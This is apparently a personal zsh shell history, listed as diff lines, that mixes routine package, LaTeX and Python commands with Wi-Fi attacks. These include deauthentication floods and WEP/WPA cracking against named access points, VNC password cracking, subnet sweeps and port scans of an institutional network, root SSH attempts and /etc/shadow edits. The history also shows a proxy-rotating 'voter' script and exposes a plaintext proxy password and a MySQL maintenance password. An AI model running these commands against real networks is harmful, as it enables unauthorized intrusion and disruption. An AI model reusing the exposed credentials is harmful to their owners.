+cowpatty -d - -s uniyar -r t3mp/dump/handshake_uniyar.cap
+wesside-ng -i wlan0
+sudo wesside-ng -i wlan0
+sudo wesside-ng -i mon0
+easside-ng 
+pyrit benchmark
+sudo ifdown wlan0
+fping 10.7.15.0/16
+fping 10.7.15.0
+fping 
+fping -a -g 10.7.15.0/16
+fping -g 10.7.15.0/16
+fping -g 10.7.15.0/24
+nmap 10.7.15.0/24
+vncviewer 10.7.15.220 5900
+vncviewer 10.7.15.220::5900
+vncviewer -viewonly 10.7.15.220::5900
+vncrack 10.7.15.220::5900
+sudo vncrack 10.7.15.220::5900
+sudo vncrack -a -h 10.7.15.220
+sudo airmon-ng start mon0
+sudo airodump-ng -w t3mp/dump/7corp_four-01.04 mon0
+sudo airodump-ng -i -t WEP -b 1C:BD:B9:2A:68:DC -w t3mp/dump/TEH_WEP mon0
+airodump-ng --help
+sudo airodump-ng --ivs --encrypt WEP --channel 10 --bssid 1C:BD:B9:2A:68:DC --write t3mp/dump/TEH_WEP mon0
+macchanger
+macchanger --help
+macchanger -s
+macchanger -s wlan0
+aircrack-ng t3mp/dump/*.cap
+aireplay-ng -0 1 -a  00:11:D8:60:57:AD  B8:F9:34:7C:B4:90  -83    0 - 1      0        3 -c (client) mon0
+aireplay-ng -0 1 -a 00:1C:F0:D6:BA:1C mon0
+sudo aireplay-ng -0 1 -a 00:1C:F0:D6:BA:1C mon0
+sudo aireplay-ng -0 10 -a 00:1C:F0:D6:BA:1C mon0
+sudo aireplay-ng -0 1 -a 00:1C:F0:D6:BA:1C wlan0
+sudo aireplay-ng -0 10 -a 00:1C:F0:D6:BA:1C wlan0
+sudo aireplay-ng -0 100 -a 00:1C:F0:D6:BA:1C wlan0
+sudo kill -9 6948
+sudo kill -9 6952
+sudo ifconfig wlan0
+sudo ifconfig wlan0 
+sudo kill -9 16072 16076
+sudo kill -9  16076
+pgrep wicd
+sudo kill -9 17417 17421
+sudo wicd-gtk
+sudo airodump-ng --encrypt WPA --channel 6 --bssid 00:1C:F0:D6:BA:1C --write t3mp/dump/WPA mon0
+airmon-ng
+airmon-ng stop mon0 
+airmon-ng start mon0 
+airmon-ng start wlan0 
+sudo airodump-ng --ivs --encrypt WEP --channel 10 --bssid 1C:BD:B9:2A:68:DC --write t3mp/dump/WEP mon0
+rm t3mp/dump/TEH_WEP-01.ivs
+rm t3mp/dump/*.ivs
+airodump-ng -w t3mp/dump/7corp_four-01.04-01
+airmon-ng stop mon0
+airmon-ng start mon0
+airodump-ng -w t3mp/dump/7corp_four-01.04-01 mon0
+sudo airmon-ng stop mon0
+sudo airmon-ng stop wlan0
+sudo wicd-curses
+ls .
+l .*
+l .* G leo
+ll G leo
+sudo chmod 552 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 332 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 111 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 222 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 333 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 444 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 666 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 665 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 661 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 662 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+sudo chmod 664 /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+ll /usr/local/lib/python2.7/site-packages/leo/config/leoSettings.leo
+rm .leo/workbook.leo
+ssh -l root 10.7.17.177
+sudo airmon-ng
+sudo airmon-ng wlan
+sudo airmon-ng wlan0
+sudo airmon-ng start wlan0 
+sudo airodump-ng mon0\
+sudo airodump-ng mon0
+startX
+у�у�у�е
+kill -9 6135
+kill -9 6152
+kill -9 6252 6257 6331 6211
+mkdir moumt
+mount win_t3mp/xa.iso
+mount -o loop win_t3mp/xa.iso
+ping 10.7.0.2
+telnet 10.7.0.2 3128
+nmap 10.7.17.193
+apt-cache search flv
+apt-get install flvtool2
+mencoder
+flv2divx t3mp/downloads/SC3224378.flv
+flv2xvid t3mp/downloads/SC3224378.flv
+flvtool2
+apt-get install totem
+ffmpeg -i t3mp/downloads/SC3224378.flv -ab 56 -ar 22050 -b 500 -s 320x240 test.mpg
+sudo dpkg -i t3mp/downloads/install_flash_player_10_linux.deb
+sudo shutdown -h 200
+apt-cache search game
+apt-cache search game G game
+pgrep yakoake
+pgrep yakuake
+kill 6101
+yakuake
+dropbox autostart
+dropbox status
+cp -r .zshrc .vimrc .vimperatorrc .vim .bashrc  t3mp/Dropbox
+sudo cp -r .zshrc .vimrc .vimperatorrc .vim .bashrc  t3mp/Dropbox
+dropbox ls
+cd t3mp/Dropbox
+dropbox filestatus
+mv proxy_parser.py ~
+vi voter_tor.py
+vi proxy_parser.py
+apt-cache search owl
+apt-cache search owl rss
+apt-cache search owl G owl
+whois http://putinvzrivaetdoma.org/
+whois putinvzrivaetdoma.org
+openoffice.org3
+whois leprosorium.ru
+at
+man at
+apt-get install RedNotebook
+apt-cache search posterous
+k3b
+ping 10.7.17.172
+python proxy_parser.py >list
+upack Ѓ�евин\ Ѓ�итник,\ Ѓ�илу�у�м\ Саймон\ Ѓ�ску�сство\ обмана.7z
+7z Ѓ�евин\ Ѓ�итник,\ Ѓ�илу�у�м\ Саймон\ Ѓ�ску�сство\ обмана.7z
+7z
+7z e Ѓ�евин\ Ѓ�итник,\ Ѓ�илу�у�м\ Саймон\ Ѓ�ску�сство\ обмана.7z
+grep export .zhistory
+upack sklyarov_iskusstvo_zashiti_i_vzloma_informacii\[torrents.ru\].rar
+cp voter.py solution
+vi voter.py
+python proxy_parser.py
+kill -9 7165 7093 7176 7179 7177 7176
+kill -9  7093 7176 7179 7177 7176
+kill -9 7070
+sudo shutdown -h 60
+vi rb-tree.cpp
+apt-cache search dlp
+uproj
+python .script/full_mail.py
+wine .wine/drive_c/Team17/SGPDemo/config.exe
+.script/full_mail.py
+vi .script/full_mail.py
+nmap http://ivt.corp7.uniyar.ac.ru/moodle/
+host http://ivt.corp7.uniyar.ac.ru/
+host ivt.corp7.uniyar.ac.ru
+nmap 10.7.0.33
+nc 10.7.0.33 8008
+nc 10.7.0.33 80
+python proxy_parser.py > list & python voter.py
+export http_proxy='http://bednyakov:Pro100pasproxy.lan:3128'
+export http_proxy='http://bednyakov:Pro100pas@proxy.lan:3128'
+python proxy_parser.py 
+python proxy_parser.py > list
+python voter.py
+./a.out
+rm a.out
+gcc rb-tree.cpp
+g++ rb-tree.cpp
+chmod u+x voter.py proxy_parser.py
+mv voter.py proxy_parser.py ~/.script
+rm voter_tor.py
+rm rb-tree.cpp
+rm solution
+ssh 10.7.17.186
+nmap -pN 10.7.17.186
+nmap -nP 10.7.17.186
+nmap -Pn 10.7.17.177
+ssh 10.7.17.177
+ssh 10.7.17.177 -l root
+fping
+fping -g 10.7.17.0/24
+fping -g 10.7.17.0/16
+fping -h
+fping -a -g 10.7.17.0/16
+fping -ag 10.7.17.0/16
+fping -a
+ping 10.7.17.0/24
+man -b ping
+ping -b 10.7.17.0/24
+ping -b 10.7.17.0
+man ping
+nmap -Pn 10.7.17.186
+nmap -p 1-100000 10.7.17.186
+nmap -p 1-65535 10.7.17.186
+nmap -Pn -p 1-65535 10.7.17.186
+cp t3mp/downloads/MyDLP-Win-EP-with-Dependencies.zip
+cp t3mp/downloads/MyDLP-Win-EP-with-Dependencies.zip /var/www
+sudo cp t3mp/downloads/MyDLP-Win-EP-with-Dependencies.zip /var/www
+ping 10.7.17.3
+ifup
+fping 10.7.17.0/24
+nmap -sP 10.7.17.0/24
+nmap -O 10.7.17.186
+nmap  10.7.17.186
+airodump-ng wlan0
+airmon-ng stop wlan0
+host google.com
+ping 74.125.232.52
+dnsset
+dnsset -s
+dnsset -s 8.8.8.8
+dnsset -s 8.8.4.4
+dnsset -l
+dnsset -s uni-uk
+ping google.com
+.script/proxy_parser.py > list & .script/voter.py
+rm list
+.script/proxy_parser.py > .script/list & .script/voter.py
+.script/proxy_parser.py > .script/list && .script/voter.py
+.script/proxy_parser.py > list
+cat list
+rm .script/list
+man halt
+pychess
+vi .script/voter.py
+sudo dpkg -i t3mp/downloads/skype-ubuntu_2.2.0.25-1_i386.deb
+rm t3mp/downloads/skype-ubuntu_2.2.0.25-1_i386.deb
+upack t3mp/downloads/Xakep1209.zip
+upack t3mp/downloads/kukushka_i_slon7x16.rar
+rm t3mp/downloads/kukushka_i_slon7x16.rar
+sudo shutdown -h 180
+start x
+.script/voter.py
+apt-get install kdebluetooth
+sudo shutdown -h 120
+,nnfrsov
+sudo shutdown -h now
+ll t3mp/torrent/Bomgh\ so\ stvolom.chopper887
+sudo mv t3mp/torrent/Bomgh\ so\ stvolom.chopper887/Bomgh\ so\ stvolom.chopper887.avi /var/www
+sudo rename s/.*\.avi/bomg.avi/ /var/www/Bomgh\ so\ stvolom.chopper887.avi
+sudo rename s/*.\.avi/bomg.avi/ /var/www/Bomgh\ so\ stvolom.chopper887.avi
+rm -rf .rtorrent_session
+vi .rtorrent_session
+mkdir /home/s0v/.rtorrent_session/
+vi .rtorrent.rc
+konqeror 
+rm /var/www/Bomgh.avi
+kbluetooth4
+pgrep rtor
+kill -9 8545
+sudo rm *.mp3
+kill
+wget http://nekaka.com/files/download/13584/house.md.s07e18.k3.avi
+iwconfig
+nm-conector
+nm-connection-editor
+cp /etc/network/interfaces /home/s0v/.script/if_real
+vi .script/ap.sh
+cp /home/s0v/.script/if_real /etc/network/interfaces
+rm /home/s0v/.script/if_real 
+apt-get install network-manager-kde-kde3
+echo "messa/nmess"
+echo "mess\nmess"
+apt-get install kwifimanager-kde3
+kwifimanager
+vi /etc/network/interfaces
+sudo iwconfig wlan0
+sudo iwconfig wlan0 down
+sudo iwconfig wlan0 enc
+sudo iwconfig wlan0 enc 123456
+sudo iwconfig wlan0 enc 12345
+sudo iwconfig wlan0 enc thepass
+apt-get remove network-manager
+,nfrsov
+cat /etc/profile.d/
+cll /etc/profile.d/
+ll /etc/profile.d/
+sudo ifup
+apt-cache search ipsec
+cvi .zshrc
+halt
+vncviewer 10.7.17.193
+konqeror
+ping 192.168.0.50
+ifdown eth0
+vncviewer 10.7.17.176
+sudo umount /media/flash
+sudo mount /dev/sdb /media/flash
+cp .zshrc /media/Nokia\ N900/zsh
+mp32utf /media/Nokia\ N900/.sounds/Ѓ�у�соу�кий
+mp32utf /media/Nokia\ N900/.sounds/Ѓ�у�соу�кий/*
+cd /media/Nokia\ N900/.sounds/Ѓ�у�соу�кий/*
+cd /media/Nokia\ N900/.sounds/Ѓ�у�соу�кий/
+mp32utf 
+sudo shutdown -h 240
+rtorrent
+ps aux | grep bass
+ps aux | bash 
+ssh -lroot 10.7.17.176
+ifconfig eth0 192.168.0.1
+sudo ifconfig eth0 192.168.0.1
+proj
+nmap 10.7.17.176
+nmap -Pn 10.7.17.176
+nmap -p 3306 10.7.17.176
+/etc/init.d/mysql
+/etc/init.d/mysql start
+sudo /etc/init.d/mysql start
+sudo /etc/init.d/mysql restart
+mysql -uroot -p
+vi /etc/passwd
+vi /etc/shadow
+rootvi /etc/shadow
+sudo vi /etc/shadow
+lexa
+sudo poweroff
+iwconfig wlan0 channel 1
+iwconfig wlan0 Bit 54Mbs
+iwconfig wlan0 essid 'My Wifi'
+ifconfig wlan0 10.42.43.1 netmask 255.255.255.0 up
+echo 1  procsysnetipv4ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+apt-get install gedit
+sudo gedit etcdhcp3dhcpd.conf
+sudo gedit /etc/dhcp3/dhcpd.conf
+vi /etc/dhcp3/dhcpd.conf
+/etc/init.d/dhcp3-server restart
+vi /etc/default/dhcp3-server
+apt-cache search wifi
+apt-cache search ad hoc
+apt-cache search adhoc
+vi /etc/hostapd/hostapd.conf
+vi /etc/default/hostapd
+service hostapd start
+sudo apt-get install linux-backports-modules-intrepid
+init 6
+sudo apt-get install wireless-tools dhcp3-server
+sudo halt
+mv .sounds sounds
+mv sounds .sounds
+airodump-ng -w ./t3mp/dump/seven_corp mon0
+vi /etc/passwd 
+vi /etc/shadow 
+apt-cache search mysql gui
+export http_proxy='http://proxy.lan:3128'
+apt-get install mysql-admin
+mysql-admin
+root@bt ~
+>>                                                               -- INSERT --
+Downloads/                   pt/
+house.md.s07e18.k3.avi       t3mp/
+sudo killall vlc
+pgrep vlc
+vi /etc/mysql/conf.d/old_passwords.cnf
+vi /etc/mysql/debian.cnf
+sudo vi /etc/mysql/debian.cnf
+sudo /etc/init.d/ssh start
+ls /bin/*sql*
+ls /bin/
+ls /bin/    | grep 1
+ls /bin/    | grep sql
+ls /bin/    | grep sq
+ls /usr/bin/    | grep sq
+ls /usr/bin/    | grep mysql
+mysqlaccess
+mysqlaccess -U 
+mysqlaccess -U root
+sudo mysqlaccess -U root
+vi /etc/mysql/my.cnf
+mysqlaccess 127.0.0.1 -U root
+mysqlaccess 127.0.0.1 root
+mysqlaccess 127.0.0.1 -U admin
+sql
+mysql
+mysql -uroot
+sudo mysql -uroot
+man mysql
+mysql;
+mysql -u root
+mysql -u root -p
+mysql -u debian-sys-maint -p oglmiPamFcw9cunu
+mysql -u debian-sys-maint -p 
+sudo
+sudo -S
+mv ubuntu.iso /var/www/
+sudo airodump-ng --ivs --encrypt WEP --channel 5 --bssid 1C:BD:B9:2A:68:DC --write t3mp/dump/MathMod
+sudo airodump-ng --ivs --encrypt WEP --channel 5 --bssid 1C:BD:B9:2A:68:DC --write t3mp/dump/MathMod mon0
+sudo aircrack-ng t3mp/dump/MathMod-01.ivs
+iddqd
+aireplay-ng -1 0 -a 1C:BD:B9:2A:68:DC mon0
+sudo aireplay-ng -1 0 -a 1C:BD:B9:2A:68:DC mon0
+aireplay-ng -3 -b 1C:BD:B9:2A:68:DC mon0
+sudo aireplay-ng -3 -b 1C:BD:B9:2A:68:DC mon0
+ssh 10.7.17.176 -l root
+kill -9 6085
+kpowersave
+iisit http://www.isc.org/sw/dhcp/
+Listening on LPF/eth0/00:26:22:69:0e:a5
+Sending on   LPF/eth0/00:26:22:69:0e:a5
+Sending on   Socket/fallback
+DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 7
+DHCPOFFER of 10.7.17.193 from 10.7.17.1
+DHCPREQUEST of 10.7.17.193 on eth0 to 255.255.255.255 port 67
+DHCPACK of 10.7.17.193 from 10.7.17.1
+bound to 10.7.17.193 -- renewal in 14700 seconds.
+if-up.d/mountnfs[eth0]: waiting for interface eth1 before doing NFS mounts
+if-up.d/mountnfs[eth0]n   Socket/fallback                                  -- INSERT --
+zsh: command not found: Sending
+>> DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 7    -- INSERT --
+zsh: command not found: DHCPDISCOVER
+>> DHCPOFFER of 10.7.17.193 from 10.7.17.1                       -- INSERT --
+zsh: command not found: DHCPOFFER
+>> DHCPREQUEST of 10.7.17.193 on eth0 to 255.255.255.255 port 67 -- INSERT --
+zsh: command not found: DHCPREQUEST
+>> DHCPACK of 10.7.17.193 from 10.7.17.1                         -- INSERT --
+zsh: command not found: DHCPACK
+>> bound to 10.7.17.193 -- renewal in 14700 seconds.             -- INSERT --
+zsh: command not found: bound
+s0v@bt ~
+ubiquity
+./t3mp/downloads/unetbootin-linux-527
+sudo mount /dev/sdb1 /media/flash/
+sudo umount /media/flash/
+vi /sys/power/state
+vi /home/s0v/.conkyrc
+cvi /home/s0v/.conkyrc
+man conky
+clear
+close
+hg serve 
+hg help serve 
+mkdir pr0jects/python/ScientificCounting
+cvi hello.py
+vi ~/.zshrc
+cvi ~/.zshrc
+vi pr0jects/python/ScientificCounting
+vi pr0jects/python/ScientificCounting/loop.py
+cd pr0jects/python/ScientificCounting
+hg revert
+hg revert loop.py
+hg statuss
+vi hello.py
+hg diff
+hg diff hello.py
+hg status
+hg add *
+hg commit *
+vi /etc/mercurial/hgrc
+vi /etc/mercurial/hgrc.d/hgext.rc
+cd pr0jects/python/ScientificCounting 
+cvi hello
+hg init
+ls .hg
+ls .hg/store
+cvi .hg/00changelog.i 
+cvi .hg/requires
+mv hello hello.py
+hg add
+hg commit
+hg log
+kill 5544
+killall vmware
+kill 5616
+kill 5618 5621 5626 5629
+screen
+ping backtrack-linux.org
+sudo konqeror
+sudo killall vmware
+lynx http://backtrack-linux.org
+cmp
+apt-get install compiz
+ccmakedep
+compiz
+vi .vimperatorrc
+apt-get install ccsm
+apt-cache search compiz
+apt-get install compizconfig-settings-manager
+\
+ apt-get install ttf-ubuntu-font-family 
+apt-get install conky
+vi .conkyrc
+conky
+apt-get install yakuake
+tar xzf 136379-Divergence\ Inspired\ v0.4.tar.gz
+apt-get remove konsole yakuake
+apt-get install emerald
+emerald-theme-manager
+ccsm
+apt-get remove tilda
+emerald
+emerald --replace
+gconf-editor
+sleep
+suspend
+man suspend
+apt-get install xscreensaver-command
+apt-get install xscreensaver
+xscreensaver-command -lock
+xscreensaver
+apt-get install xscreensaver-extras xscreensaver-gl-extras
+apt-cache search xscreensaver
+apt-get install xscreensaver-data-extra xscreensaver-gl xscreensaver-data xscreensaver-gl-extra
+apt-get install transmission-gtk
+killall wicd
+sudo killall wicd
+apt-get install network-manager-gnome dnsmasq-base
+network
+network-manager
+python 
+apt-cache search pip
+apt-cache search pip python
+apt-cache search ipython
+apt-cache search gnome administration
+pllog
+apt-get install gnome-network-admin gnome-system-tools gnome-main-menu
+apt-get install python-pip ipython
+apt-cache search drop box
+apt-cache search dropbox
+dpkg --install Downloads/nautilus-dropbox_0.6.7_i386.deb
+\
+sudo dpkg --install Downloads/nautilus-dropbox_0.6.7_i386.deb
+dropbox start
+dropbox start -i
+ls /root/.gnome2
+ls /root/.gnome2/panel2.d
+ls /root/.gnome2/panel2.d/default/launchers
+ls -a /root/.gnome2/panel2.d/default/launchers
+tree
+ls -a /root/.gnome2/accels
+ls -a /root/.gnome2/keyrings
+ls -a /root/.gnome2/nautilus-scripts
+ls -a /root/.gnome2_private
+ls -a /root/.config/gnome-session/saved-session
+ls -a /root/.config/indicators
+vi /root/.config/menus/applications.menu
+vi /root/.local/share/desktop-directories/bt-ram-forensics.directory
+ls .local/share/desktop-directories
+ls -a .local/share/desktop-directories
+ls -a /home/chesh1r/.local/share/desktop-directories
+cp -rf /root/.local/share/desktop-directories/* /home/chesh1r/.local/share/desktop-directories
+ls /home/chesh1r/.local/share/desktop-directories
+ls -d /home/chesh1r/.local/share/desktop-directories
+ls -l /home/chesh1r/.local/share/desktop-directories
+chmod chesh1r:chesh1r /home/chesh1r/.local/share/desktop-directories
+apt-get install libqt4-core libqt4-gui
+dpkg -i t3mp/Dropbox/skype-debian_2.0.0.63-1_i386.deb
+apt-cache search gnome ru
+apt-cache search gnome ru language
+apt-get install language-pack-gnome-ru-base language-pack-gnome-ru 
+wget http://eion.robbmob.com/skype4pidgin.deb
+sudo dpkg -i skype4pidgin.deb
+wget http://eion.robbmob.com/libskype.so
+mv libskype.so /usr/lib/purple-2/
+kill -9  27617
+sudo pon dsl-provider
+usermod -a -G dip chesh1r
+ps aux | grep pidgin
+lspci
+lspci -v
+alsamixer 
+pulseaudio
+apt-get install pavucontrol
+pavucontrol
+network-admin
+apt-get install network-manager
+apt-get install network-manager-gnome
+apt-get install network-manager-pptp-gnome
+ls /usr/bin/*network*
+ls /usr/local/bin/*network*
+ls /usr/local/bin/*net*
+apt-get install gnome-network
+cat /etc/sys/net/ipv4/ip_forward
+cat /etc/sysctl.d/10-network-security.conf
+apt-get install tilda
+tilda
+wicd-gtk
+apt-get install dhcpd
+apt-cache search dhcpd
+iwconfig wlan0 channel 4
+iwconfig wlan0 essid 'test'
+iwconfig wlan0 key ThePassword
+iwconfig wlan0 key 'ThePassword'
+iwconfig wlan0 key '424242'
+iwconfig wlan0 key 424242
+iwconfig wlan0 key 12345
+nmap -O 192.168.0.2
+iptables
+iptables -s
+iptables -h
+iptables -t
+iptables show
+apt-get install firestarter
+sudo vi /root/.zhistory
+wpa_supplicant
+iptables-xml 
+sudo-s
+apt-get install yakuake 
+cat /etc/group
+sudo apt-get install evince
+apt-cache search rar
+apt-cache search rar gnome
+apt-cache search rar | grep rar
+apt-cache search hack
+apt-cache search hack python
+apt-cache search libsexy
+apt-cache search libre
+apt-cache search libre office
+zip Downloads/studentbank.ru_54818.zip
+zip x Downloads/studentbank.ru_54818.zip
+zip -r Downloads/studentbank.ru_54818.zip
+zip -r Downloads/studentbank.ru_54818.zip ~/
+upack Downloads/studentbank.ru_54818.zip
+cd LibO_3.3.2rc2_Linux_x86_install-deb_en-US
+cd DEBS
+umount /media/PENDRIVE
+umount /media/4DB0-5136
+sudo umount /media/*
+apt-cache search mp3 tag
+apt-cache search mp3 tag G mp3
+apt-cache search mp3 tag gnome
+apt-cache search mp3 tag Gnome
+apt-get install exfalso
+pgr fire
+la wifi
+chmod 770 wifi
+ll wifi
+man iwconfig 
+kill 3730
+./wifi
+./wifi 
+./wifi up
+iptables -L
+./wifi down
+vi wifi
+mv wifi /usr/bin
+ll /usr/bin/wifi
+ll /usr/bin/wicd-gtk
+sudo chmod 367 /usr/bin/wifi
+cd Downloads/LibO_3.3.2rc2_Linux_x86_install-deb_en-US
+vi readmes/README_en-US 
+cd DEBS/desktop-integration
+sudo dpkg -i libreoffice3.3-debian-menus_3.3-202_all.deb
+cd ../..
+LibO_3.3.2rc2_Linux_x86_langpack-deb_ru/DEBS
+dpkg -i *.deb
+sudo dpkg -i *.deb
+cd ../../..
+cd Downloads
+upack LibO_3.3.2_Linux_x86_helppack-deb_ru.tar.gz
+man tr
+man awk
+man dd
+dd
+apt-cache search chrome
+apt-cache search archiver
+apt-get install xarchiver
+apt-cache search peazip
+dpkg -i Downloads/peazip_3.7.LINUX.GTK2-2_all.deb
+apt-get install libgdk-pixbuf2.0-0
+sudo dpkg -i Downloads/peazip_3.7.LINUX.GTK2-2_all.deb
+apt-cache search libgdk-pixbuf
+apt-cache search libgdk pixbuf
+cd opt
+cd kde3/share/applications/kde
+upack Downloads/peazip-3.7.LINUX.GTK2.tgz
+./usr/local/bin/peazip
+sudo cp -rf /media/7AC4D5F1C4D5B01D/Users/chesh1r/Desktop/n900 /media/PENDRIVE
+ls /media/PENDRIVE
+apt-get -f install 
+sudo off -a
+vi test.py
+pip freeze
+pip install SciPy
+pip install Matplotlib
+sudo pip install Matplotlib
+sudo pip install matplotlib
+sudo pip install numpy
+apt-cache search matplotlib
+apt-get install python-matplotlib python-matplotlib-dbg python-matplotlib-doc python-matplotlib-data
+mkdir euler
+mv range.py euler
+sudo rm -rf build
+feh
+apt-get install feh
+cat /proc/cpuinfo
+vi .gimrc
+vi .gvimrc
+pl print 1
+iconv
+iconv -f CP1251 -t UNICODE t3mp/downloads/house.m.d.s07e23.sub.srt
+iconv -f CP1251 -t UTF-8 t3mp/downloads/house.m.d.s07e23.sub.srt
+iconv -f CP1251 -t UTF-8 t3mp/downloads/house.m.d.s07e23.sub.srt > t3mp/downloads/house.m.d.s07e23.sub.srt
+iconv -f CP1251 -t UTF-8 t3mp/downloads/house.m.d.s07.sub/house.m.d.s07e23.sub.srt > t3mp/downloads/House.S07E23.Moving.On.HDTV.XviD-2HD.srt 
+cat t3mp/downloads/House.S07E23.Moving.On.HDTV.XviD-2HD.srt 
+i
+man time
+help time
+info time
+time -h
+man ps
+ps kstart_time auxw
+python -c 'print range(10)'
+apt-cache search python psycho
+apt-cache search python psyco
+apt-get install python-psyco
+apt-get install python-psyco-doc
+man python
+vi /share/doc/rkhunter-1.3.8/README
+vi /usr/share/python-support/python-openssl.public
+vi /usr/share/pyshared/psyco/core.py
+grep 20 FAIL
+grep FAIL 20
+cut -d: 2
+cut -d : 2
+cut -d':' 2
+cut -d ':' 2
+cut -d ':' 2 20
+cut -d ':' 2 ./20
+cut -f 2 -d ':' ./20
+cut -f 2 -d ':' ./20 | grep -v FAIL
+python range.py > 20
+cut -f 3 -d ':' ./20 | grep -v FAIL
+cat ./20
+python range.py > res20
+vi -p range.py plot.py
+vi range.py > res30
+time python range.py > res30
+grep cut .zhistory
+vi euler/range.py
+cat pr0jects/python/FalseMargin/res30
+cat pr0jects/python/FalseMargin/range.py
+cd pr0jects/python/FalseMargin
+python range.py
+time python range.py
+time python range.py > res10
+cat res10
+cat res20
+rm res30
+python range.py > res30
+kill -9 14670
+kill -9 14916
+vi range.py
+python range.py 
+kill -9 15080
+kill -9 15166
+time python range.py 
+ssh 10.7.17.198
+ssh 10.7.17.128
+upack t3mp/downloads/articles.7z
+win2utf book/interrupts.txt
+iconv -f CP1251 -t UTF-8 book/interrupts.txt
+iconv -f CP1251 -t UTF-8 book/interrupts.txt > book/interrupts.txt
+apt-cache search chess
+apt-cache search pychess
+apt-get install apt-cache
+apt-get install pychess
+htop
+grc
+du -f
+du
+ch
+apt-get install -f
+recal export
+export http_proxy="http://proxy.lan:3128"
+modprobe fuse
+sshfs root@192.168.0.2:/home/user/MyDoc /home/chesh1r/n900
+nautilus
+apt-cache search mp3 tag editor
+exfalso
+umount /home/chesh1r/n900
+ssh -root 192.168.0.2
+ssh -l root 192.168.0.2
+sudo mkdir /media/n900
+sshfs root@192.168.0.2:/home/user/MyDocs /media/n900
+ls ./t3mp/downloads/jre*
+sudo chmod 777./t3mp/downloads/jre-6u25-linux-i586.bin
+sudo chmod 777 ./t3mp/downloads/jre-6u25-linux-i586.bin
+sudo ./t3mp/downloads/jre-6u25-linux-i586.bin
+./jre1.6.0_25
+sudo rm -rf jre1.6.0_25
+apt-cache search jre
+ping proxy.lan
+dmesh
+ls /dev/sd*
+ls /dev/sdb*
+fdisc /dev/sdb
+apt-get install gnuchess gnugo
+apt-cache search gnu go
+apt-cache search gnugo
+apt-get install qgo
+upa t3mp/downloads/ariel.rar
+apt-get install unrar
+upack t3mp/downloads/ariel.rar
+apt-get install guake
+killall yakuake
+quake
+guake
+vi /usr/bin/yakuake
+apt-get install ghc
+killall firestarter
+kill -9 firestarter
+kill -9 2635
+sudo kill -9 2635
+vi .ipython/history
+vi .ipython/__init__.py
+vi .ipython/ipythonrc
+python
+sudo iptables
+win2utf t3mp/downloads/mentalis03-final/the.mentalist.03x23.strawberries.and.cream.hdtv-2hd.RUS.srt
+iconv -f CP1251 -t UTF-8 t3mp/downloads/mentalis03-final/the.mentalist.03x23.strawberries.and.cream.hdtv-2hd.RUS.srt > t3mp/downloads/mentalis03-final/the.mentalist.03x23.strawberries.and.cream.hdtv-2hd.RUS.srt
+apt-cache search f spot
+f-spot
+p G nau
+kill -9 2695
+apt-cache search mp3 editor
+apt-get install id3v2 
+perl -e 'print `ls`'
+perl -e 'for(`ls`){print 1}'
+cd t3mp/downloads/Triggerfinger
+perl -e 'for(`ls`){`id3v2 -c "test - $_" ./$_`}'
+perl -e 'for(`ls`){`id3v2 -c "test - $_" ./$_/*`}'
+perl -e 'for(`ls`){`id3v2 -c "test - $_" ./$_/\*`}'
+id3v2
+man firestarter 
+firestarter -s
+sudo firestarter -s
+grep latex .zhistory
+grep tex .zhistory
+sudo apt-get install texlive texlive-lang-cyrillic
+sudo chmod 777 ./t3mp/downloads/mp3tagv248setup.exe
+tex --version
+latex test.tex
+rm test.log
+tex tex/test.tex
+vi test.tex
+tex test.tex 
+yap test.dvi
+tex first.tex
+apt-cache search latex
+apt-cache search latex G latex
+apt-cache search texlive
+sudo apt-get install texlive-doc-ru texlive-full 
+sudo apt-get install texlive-doc-ru texlive-full Texmaker
+sudo apt-get install texlive-doc-ru texlive-full texmaker
+vi .vim/backup/\~/tex/test.tex\~2011-05-29\~
+vi .vim/backup/\~/tex/first.tex\~2011-05-29\~
+cd tex
+vi first.tex
+latex first.tex
+man latex
+pdflatex first.tex
+texmaker
+latex example.tex
+pdflatex example.tex
+vi -p example.tex curse.tex
+vi -p example.tex curse/curse.tex
+cd curse
+vi -p ../example.tex curse.tex
+apt-cache search tex ru
+apt-cache search tex rus
+apt-cache search texlive rus
+apt-cache search texlive ru
+apt-cache search texlive cyrillic
+_imagemagick
+apt-get autoclean
+apt-get autoremove
+dpkg --configure
+sudo dpkg --configure
+apt-get remove dradis
+apt-get install texlive-lang-cyrillic
+latex tex/curse/curse.tex
+vi  tex/curse/curse.tex
+apt-get install texlive-latex-recommended
+vi example.tex
+latex /home/chesh1r/tex/curse/curse.tex
+vi -p /home/chesh1r/tex/example.tex /home/chesh1r/tex/curse/curse.tex
+vi  /home/chesh1r/tex/curse/curse.tex
+vi  /home/chesh1r/tex/curse/curse.tex /home/chesh1r/tex/curse/cheatsheet
+vi -p /home/chesh1r/tex/curse/curse.tex /home/chesh1r/tex/curse/cheatsheet
+mv /home/chesh1r/tex/curse/cheatsheet /home/chesh1r/tex/curse/cheatsheet.tex
+pdflatex /home/chesh1r/tex/curse/curse.tex
+python count.py > res
+vi res
+rm res
+latex curse.tex
+pdflatex curse.tex
+vi count.py
+vi -p /home/chesh1r/tex/curse/curse.tex 
+vi -p /home/chesh1r/tex/curse/curse.tex /home/chesh1r/tex/curse/cheatsheet.tex
+vi -p tex/curse/*.py
+pdftex curse.tex
+recal cut
+cut -f 1 -d ':' ./res30 | grep -v FAIL
+cut -f 2 -d ':' ./res30 | grep -v FAIL
+cut -f 3 -d ':' ./res30 | grep -v FAIL
+cut -f 1 -d ':' ./res30-34 | grep -v FAIL
+cut -f 2 -d ':' ./res30-34 | grep -v FAIL
+cut -f 3 -d ':' ./res30-34 | grep -v FAIL
+cd FalseMargin
+vi plot.py
+cat res30
+apt-get install sam2p
